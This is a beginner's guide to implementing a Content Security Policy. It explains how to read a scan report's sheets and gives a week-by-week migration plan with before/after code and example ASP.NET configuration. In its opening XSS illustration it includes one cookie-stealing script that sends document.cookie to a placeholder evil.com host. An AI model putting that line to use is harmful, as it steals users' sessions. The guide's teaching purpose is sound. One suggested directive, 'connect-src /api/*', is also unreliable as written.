# 🎓 CSP Implementation Guide for Developers

**Your First Time Implementing Content Security Policy? Start Here!**

---

## 📋 Table of Contents

1. [Understanding Your Scan Results](#understanding-your-scan-results)
2. [What is CSP and Why Do We Need It?](#what-is-csp-and-why-do-we-need-it)
3. [Reading the Code_Inventory.xlsx](#reading-the-code_inventoryxlsx)
4. [Step-by-Step Implementation Plan](#step-by-step-implementation-plan)
5. [Common Mistakes to Avoid](#common-mistakes-to-avoid)
6. [Testing Your CSP](#testing-your-csp)
7. [Going to Production](#going-to-production)

---

## 🎯 Understanding Your Scan Results

### What Just Happened?

You ran the RepoScan Auditor and got:
- ✅ **Code_Inventory.xlsx** - Your complete audit report
- ✅ **Extracted_Code/** folder - All problematic code extracted
- ✅ **Annotated_Source/** folder - Your code with helpful comments

**Think of it like this:**
- The tool is a **security inspector** that walked through your entire codebase
- It found every piece of code that **violates CSP rules**
- It extracted the violations and told you **exactly how to fix them**

---

## 🔒 What is CSP and Why Do We Need It?

### The Problem (Without CSP):

Your web application is vulnerable to **XSS (Cross-Site Scripting)** attacks:

```html
<!-- Attacker injects this: -->
<script>
  // Steal user cookies and send to attacker
  fetch('https://evil.com/steal?data=' + document.cookie);
</script>
```

**Result:** User data stolen, session hijacked, game over! 😱

---

### The Solution (With CSP):

CSP is like a **security bouncer** for your website:

```http
Content-Security-Policy: script-src 'self'; style-src 'self';
```

**Translation:** "Only allow scripts and styles from MY domain. Block everything else!"

**Result:** Attacker's script is **blocked** by the browser! 🛡️

---

### Why CSP Blocks Inline Code:

**Inline JavaScript (BLOCKED by CSP):**
```html
<button onclick="alert('hi')">Click</button>  ❌
<script>console.log('test');</script>  ❌
```

**Why?** The browser can't tell if YOU wrote it or an ATTACKER injected it!

**External JavaScript (ALLOWED by CSP):**
```html
<script src="/js/app.js"></script>  ✅
```

**Why?** The browser knows this file came from YOUR server!

---

## 📊 Reading the Code_Inventory.xlsx

### Understanding the 12 Sheets:

Let me walk you through what each sheet means:

---

#### 1️⃣ **Summary Sheet**

**What it shows:** High-level overview of all findings

**Example:**
```
Category              | Found Count | RepoScan Comparison
---------------------|-------------|--------------------
Inline JS            | 42          | Matches Audit
Internal JS Blocks   | 9           | Matches Audit
AJAX Requests        | 138         | Matches Audit
```

**What this means:**
- You have **42 inline JavaScript** violations (e.g., `onclick="..."`)
- You have **9 internal script blocks** (e.g., `<script>...</script>`)
- You have **138 AJAX calls** that need whitelisting

**Developer Action:** This is your **TODO list size**. Don't panic! We'll tackle it step by step.

---

#### 2️⃣ **Inline JS (Attributes) Sheet**

**What it shows:** Every `onclick`, `onload`, `onerror`, etc. in your HTML

**Example Row:**
```
File Path: WebGoat/Login.aspx
Line: 45
Code: <button onclick="submitForm()">Login</button>
Status: Violates CSP
Action Required: Move to external JS file
```

**What this means:**
- You have inline event handlers that CSP will **block**
- You need to **move this code** to an external `.js` file

**Developer Action:**

**BEFORE (Violates CSP):**
```html
<button onclick="submitForm()">Login</button>
```

**AFTER (CSP Compliant):**
```html
<!-- In your HTML -->
<button id="loginBtn">Login</button>

<!-- In your external app.js file -->
document.getElementById('loginBtn').addEventListener('click', submitForm);
```

---

#### 3️⃣ **Internal JS (Blocks) Sheet**

**What it shows:** Every `<script>...</script>` block in your HTML files

**Example Row:**
```
File Path: WebGoat/Default.aspx
Line: 10-25
Code: <script>
        $(document).ready(function() {
          // initialization code
        });
      </script>
Status: Violates CSP
Extracted File: output/Extracted_Code/internal_js/Default_aspx_L10_script.js
```

**What this means:**
- You have JavaScript **embedded in HTML**
- CSP will **block** this
- The tool already **extracted it** for you!

**Developer Action:**

**BEFORE (Violates CSP):**
```html
<head>
  <script>
    $(document).ready(function() {
      console.log('App loaded');
    });
  </script>
</head>
```

**AFTER (CSP Compliant):**
```html
<head>
  <script src="/js/app-init.js"></script>
</head>
```

**In `/js/app-init.js`:**
```javascript
$(document).ready(function() {
  console.log('App loaded');
});
```

**Pro Tip:** The extracted file is already in `output/Extracted_Code/internal_js/` - just copy it!

---

#### 4️⃣ **External JS (Files) Sheet**

**What it shows:** External scripts you're loading (CDNs, libraries)

**Example Row:**
```
File Path: WebGoat/Master.aspx
Source: https://code.jquery.com/jquery-1.12.4.min.js
Is Remote?: Yes
Action Required: Add to CSP whitelist
```

**What this means:**
- You're loading jQuery from a CDN
- You need to **whitelist this domain** in your CSP

**Developer Action:**

Add to your CSP header:
```http
Content-Security-Policy: script-src 'self' https://code.jquery.com;
```

**Translation:** "Allow scripts from my domain AND from code.jquery.com"

---

#### 5️⃣ **Inline CSS (Attributes) Sheet**

**What it shows:** Every `style="..."` attribute in your HTML

**Example Row:**
```
File Path: WebGoat/Products.aspx
Line: 67
Code: <div style="color: red; font-weight: bold;">Error!</div>
Status: Violates CSP
Action Required: Move to CSS class
```

**Developer Action:**

**BEFORE (Violates CSP):**
```html
<div style="color: red; font-weight: bold;">Error!</div>
```

**AFTER (CSP Compliant):**
```html
<!-- In HTML -->
<div class="error-message">Error!</div>

<!-- In your CSS file -->
.error-message {
  color: red;
  font-weight: bold;
}
```

---

#### 6️⃣ **Internal CSS (Blocks) Sheet**

**What it shows:** Every `<style>...</style>` block in your HTML

**Developer Action:** Same as Internal JS - move to external `.css` file

---

#### 7️⃣ **External CSS (Files) Sheet**

**What it shows:** External stylesheets (Bootstrap, Font Awesome, etc.)

**Developer Action:** Add their domains to CSP `style-src` directive

---

#### 8️⃣ **AJAX Code Sheet** ⭐ IMPORTANT!

**What it shows:** Every AJAX call in your application

**Example Row:**
```
File Path: WebGoat/api.js
Line: 45
Code: $.ajax({ url: '/api/users', method: 'GET' })
Endpoint: /api/users
Has Server Dependencies: Yes - API Call
Action Required: Whitelist endpoint in connect-src
```

**What this means:**
- Your app makes AJAX calls to `/api/users`
- You need to **whitelist this** in CSP `connect-src`

**Developer Action:**

Add to CSP:
```http
Content-Security-Policy: connect-src 'self' /api/*;
```

**Translation:** "Allow AJAX calls to my domain and /api/* endpoints"

---

#### 9️⃣ **Dynamic Code Sheet**

**What it shows:** Code that uses `eval()`, `new Function()`, `setTimeout('string')`, etc.

**Example Row:**
```
Code: eval('var x = 10;')
Status: CRITICAL - Violates CSP
Action Required: Refactor to remove eval()
```

**What this means:**
- You're using **eval()** which is a **security nightmare**
- CSP will **block** this (and that's good!)

**Developer Action:**

**BEFORE (Dangerous!):**
```javascript
eval('var x = 10;');
```

**AFTER (Safe):**
```javascript
var x = 10;  // Just write it directly!
```

**For dynamic code:**
```javascript
// BEFORE (Bad)
setTimeout('doSomething()', 1000);

// AFTER (Good)
setTimeout(function() { doSomething(); }, 1000);
```

---

#### 🔟 **External Assets Sheet**

**What it shows:** Images, fonts, videos from external sources

**Developer Action:** Add domains to `img-src`, `font-src`, `media-src`

---

#### 1️⃣1️⃣ **Whitelist Recommendations Sheet**

**What it shows:** Auto-generated CSP directives based on your findings

**Example:**
```
Directive: script-src
Recommended Value: 'self' https://code.jquery.com https://cdn.jsdelivr.net
```

**Developer Action:** Copy these recommendations to build your CSP header!

---

#### 1️⃣2️⃣ **Scan Errors Sheet**

**What it shows:** Files that couldn't be scanned (encoding errors, permission issues)

**Developer Action:** Review and fix file access issues if any

---

## 🚀 Step-by-Step Implementation Plan

### Phase 1: Preparation (Week 1)

**Goal:** Understand the scope and set up your environment

#### Step 1: Review Your Findings
```
✅ Open Code_Inventory.xlsx
✅ Look at Summary sheet - note the counts
✅ Don't panic! This is normal for first-time CSP
```

#### Step 2: Set Up a Test Environment
```
✅ Create a copy of your application
✅ Set up a local test server
✅ Install browser DevTools (Chrome/Firefox)
```

#### Step 3: Enable CSP in Report-Only Mode
```
✅ Add this header to your web.config or middleware:
   Content-Security-Policy-Report-Only: default-src 'self';
✅ This WON'T break anything - just reports violations
```

**In ASP.NET web.config:**
```xml
<system.webServer>
  <httpProtocol>
    <customHeaders>
      <add name="Content-Security-Policy-Report-Only" 
           value="default-src 'self';" />
    </customHeaders>
  </httpProtocol>
</system.webServer>
```

---

### Phase 2: Fix Inline JavaScript (Week 2-3)

**Goal:** Move all inline JS to external files

#### Step 1: Start with Inline JS (Attributes)

**Open:** `Inline JS (Attributes)` sheet in Excel

**For each row:**

1. **Find the file** (Column: File Path)
2. **Go to the line** (Column: Line Start)
3. **See the code** (Column: Code Context)
4. **Check extracted file** (Column: Extracted File Path)

**Example Fix:**

**File:** `WebGoat/Login.aspx` (Line 45)

**BEFORE:**
```html
<button onclick="validateForm()">Submit</button>
```

**AFTER:**
```html
<!-- In Login.aspx -->
<button id="submitBtn">Submit</button>

<!-- In /js/login.js (create this file) -->
document.getElementById('submitBtn').addEventListener('click', validateForm);
```

**Repeat for all 42 inline JS findings!**

---

#### Step 2: Move Internal JS Blocks

**Open:** `Internal JS (Blocks)` sheet

**For each row:**

1. **Copy the extracted file** from `output/Extracted_Code/internal_js/`
2. **Paste into** `/js/` folder in your project
3. **Replace the `<script>` block** with `<script src="/js/filename.js"></script>`

**Example:**

**BEFORE (in Default.aspx):**
```html
<script>
  $(document).ready(function() {
    initializeApp();
  });
</script>
```

**AFTER:**
```html
<script src="/js/default-init.js"></script>
```

**In `/js/default-init.js`:**
```javascript
$(document).ready(function() {
  initializeApp();
});
```

**Pro Tip:** The tool already extracted this for you! Just copy from `output/Extracted_Code/internal_js/Default_aspx_L10_script.js`

---

### Phase 3: Fix Inline CSS (Week 4)

**Goal:** Move all inline styles to CSS classes

#### Step 1: Create a Utility CSS File

Create `/css/utilities.css`:
```css
/* Common inline styles converted to classes */
.text-red { color: red; }
.text-bold { font-weight: bold; }
.hidden { display: none; }
.text-center { text-align: center; }
```

#### Step 2: Replace Inline Styles

**Open:** `Inline CSS (Attributes)` sheet

**For each row:**

**BEFORE:**
```html
<div style="color: red; font-weight: bold;">Error!</div>
```

**AFTER:**
```html
<div class="text-red text-bold">Error!</div>
```

---

### Phase 4: Fix AJAX and Dynamic Code (Week 5)

#### Step 1: Review AJAX Calls

**Open:** `AJAX Code` sheet

**Look at:** "Has Server Dependencies" column

**For each "Yes - API Call":**
- Note the endpoint (e.g., `/api/users`)
- Add to your CSP `connect-src` whitelist

#### Step 2: Fix eval() and Dynamic Code

**Open:** `Dynamic Code` sheet

**For each eval():**

**BEFORE (Dangerous):**
```javascript
var code = 'var x = 10;';
eval(code);
```

**AFTER (Safe):**
```javascript
var x = 10;  // Just write it directly!
```

**For setTimeout with strings:**

**BEFORE:**
```javascript
setTimeout('doSomething()', 1000);
```

**AFTER:**
```javascript
setTimeout(doSomething, 1000);
```

---

### Phase 5: Build Your CSP Header (Week 6)

**Goal:** Create your final CSP policy

#### Step 1: Use the Whitelist Recommendations Sheet

**Open:** `Whitelist Recommendations` sheet

**You'll see something like:**
```
script-src: 'self' https://code.jquery.com https://cdn.jsdelivr.net
style-src: 'self' https://fonts.googleapis.com
connect-src: 'self' /api/*
img-src: 'self' data: https:
font-src: 'self' https://fonts.gstatic.com
```

#### Step 2: Build Your CSP Header

**Start with this template:**
```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://code.jquery.com;
  style-src 'self' https://fonts.googleapis.com;
  connect-src 'self';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
```

#### Step 3: Add to Your Application

**ASP.NET (web.config):**
```xml
<system.webServer>
  <httpProtocol>
    <customHeaders>
      <add name="Content-Security-Policy-Report-Only" 
           value="default-src 'self'; script-src 'self' https://code.jquery.com; style-src 'self';" />
    </customHeaders>
  </httpProtocol>
</system.webServer>
```

**ASP.NET Core (Startup.cs):**
```csharp
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("Content-Security-Policy-Report-Only",
        "default-src 'self'; script-src 'self' https://code.jquery.com;");
    await next();
});
```

---

### Phase 6: Testing (Week 7)

**Goal:** Test everything works with CSP

#### Step 1: Test in Report-Only Mode

1. **Deploy with `Content-Security-Policy-Report-Only`**
2. **Open browser DevTools** (F12)
3. **Go to Console tab**
4. **Look for CSP violations:**

```
[Report Only] Refused to execute inline script because it violates CSP
```

#### Step 2: Fix Remaining Violations

**For each violation:**
1. Note the file and line number
2. Check if it's in your tracker
3. Fix it using the patterns above

#### Step 3: Verify No Violations

**When you see:**
```
Console: (no CSP violations)
```

**You're ready for enforcement!**

---

### Phase 7: Enforcement (Week 8)

**Goal:** Enable CSP in enforcement mode

#### Step 1: Switch to Enforcement Mode

**Change header from:**
```
Content-Security-Policy-Report-Only: ...
```

**To:**
```
Content-Security-Policy: ...
```

#### Step 2: Monitor Production

**Set up CSP reporting:**
```http
Content-Security-Policy: 
  default-src 'self';
  report-uri /csp-violation-report;
```

**Create endpoint to log violations:**
```csharp
[HttpPost("/csp-violation-report")]
public IActionResult CspReport([FromBody] CspViolationReport report)
{
    _logger.LogWarning("CSP Violation: {0}", report);
    return Ok();
}
```

---

## ⚠️ Common Mistakes to Avoid

### Mistake #1: Using 'unsafe-inline'

**DON'T DO THIS:**
```http
Content-Security-Policy: script-src 'self' 'unsafe-inline';
```

**Why?** This defeats the entire purpose of CSP! It allows inline scripts, which is what attackers use!

**DO THIS INSTEAD:**
- Move all inline code to external files (like we showed above)

---

### Mistake #2: Using 'unsafe-eval'

**DON'T DO THIS:**
```http
Content-Security-Policy: script-src 'self' 'unsafe-eval';
```

**Why?** This allows `eval()`, which is a security nightmare!

**DO THIS INSTEAD:**
- Refactor code to remove `eval()`
- Use `JSON.parse()` instead of `eval()` for JSON

---

### Mistake #3: Allowing All Domains

**DON'T DO THIS:**
```http
Content-Security-Policy: script-src *;
```

**Why?** This allows scripts from ANY domain! Attackers can inject scripts from their servers!

**DO THIS INSTEAD:**
- Only whitelist specific domains you trust
- Use `'self'` for your own domain

---

### Mistake #4: Skipping Report-Only Mode

**DON'T:**
- Go straight to enforcement mode

**WHY?**
- You'll break your entire application!
- Users will see blank pages!

**DO THIS INSTEAD:**
- Always start with `Content-Security-Policy-Report-Only`
- Test thoroughly
- Fix all violations
- THEN switch to enforcement

---

### Mistake #5: Not Testing in All Browsers

**DON'T:**
- Only test in Chrome

**WHY?**
- Different browsers have different CSP support
- Safari, Firefox, Edge may behave differently

**DO THIS INSTEAD:**
- Test in Chrome, Firefox, Safari, Edge
- Check browser compatibility: https://caniuse.com/contentsecuritypolicy

---

## 🧪 Testing Your CSP

### Test Checklist:

```
✅ All pages load without errors
✅ All buttons and forms work
✅ All AJAX calls succeed
✅ All images load
✅ All fonts load
✅ No console errors
✅ DevTools shows no CSP violations
✅ Tested in Chrome, Firefox, Safari, Edge
✅ Tested on mobile devices
✅ Tested all user workflows (login, checkout, etc.)
```

### Testing Tools:

1. **Browser DevTools (F12)**
   - Console tab shows CSP violations
   - Network tab shows blocked resources

2. **CSP Evaluator**
   - https://csp-evaluator.withgoogle.com/
   - Paste your CSP and get security recommendations

3. **Report URI**
   - https://report-uri.com/
   - Free CSP reporting service

---

## 🚀 Going to Production

### Pre-Production Checklist:

```
✅ All code changes committed to version control
✅ All inline JS moved to external files
✅ All inline CSS moved to CSS classes
✅ All eval() removed
✅ CSP header configured
✅ Tested in Report-Only mode for 1 week
✅ Zero violations in DevTools
✅ All user workflows tested
✅ Stakeholders approved
✅ Rollback plan ready
```

### Deployment Strategy:

#### Option 1: Gradual Rollout (Recommended)

**Week 1:** 10% of users
```
- Monitor for violations
- Fix any issues
```

**Week 2:** 50% of users
```
- Monitor for violations
- Verify no performance impact
```

**Week 3:** 100% of users
```
- Full enforcement
- Continue monitoring
```

#### Option 2: Feature Flag

```csharp
if (_featureFlags.IsCspEnabled)
{
    context.Response.Headers.Add("Content-Security-Policy", cspPolicy);
}
```

**Benefit:** Can quickly disable if issues arise

---

## 📚 Additional Resources

### Official Documentation:
- **MDN CSP Guide:** https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- **W3C CSP Spec:** https://www.w3.org/TR/CSP3/

### Tools:
- **CSP Evaluator:** https://csp-evaluator.withgoogle.com/
- **Report URI:** https://report-uri.com/
- **CSP Builder:** https://report-uri.com/home/generate

### Learning:
- **OWASP CSP Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- **Google CSP Guide:** https://developers.google.com/web/fundamentals/security/csp

---

## 🎯 Summary: Your 8-Week Plan

| Week | Task | Deliverable |
|------|------|-------------|
| 1 | Review findings, set up test environment | Test environment ready |
| 2-3 | Fix inline JavaScript | All inline JS moved to external files |
| 4 | Fix inline CSS | All inline styles moved to CSS classes |
| 5 | Fix AJAX and dynamic code | All eval() removed, AJAX whitelisted |
| 6 | Build CSP header | CSP policy defined |
| 7 | Test in Report-Only mode | Zero violations in DevTools |
| 8 | Deploy to production | CSP enforced in production |

---

## 💡 Final Tips

1. **Start Small:** Fix one sheet at a time (start with Inline JS)
2. **Use the Extracted Files:** The tool already did half the work!
3. **Test Frequently:** Don't wait until the end to test
4. **Document Changes:** Keep a log of what you fixed
5. **Ask for Help:** CSP is complex - don't hesitate to ask questions
6. **Be Patient:** This is a big change - it takes time
7. **Celebrate Wins:** Each fixed violation is progress!

---

## ✅ You've Got This!

CSP implementation seems overwhelming at first, but:
- ✅ You have a complete audit (Code_Inventory.xlsx)
- ✅ You have extracted code ready to use
- ✅ You have this guide
- ✅ You have 8 weeks to do it right

**Remember:** Every major website went through this process. You're making your application more secure!

---

**Questions? Check the tracker, review this guide, and test in Report-Only mode first!**

**Good luck! 🚀**
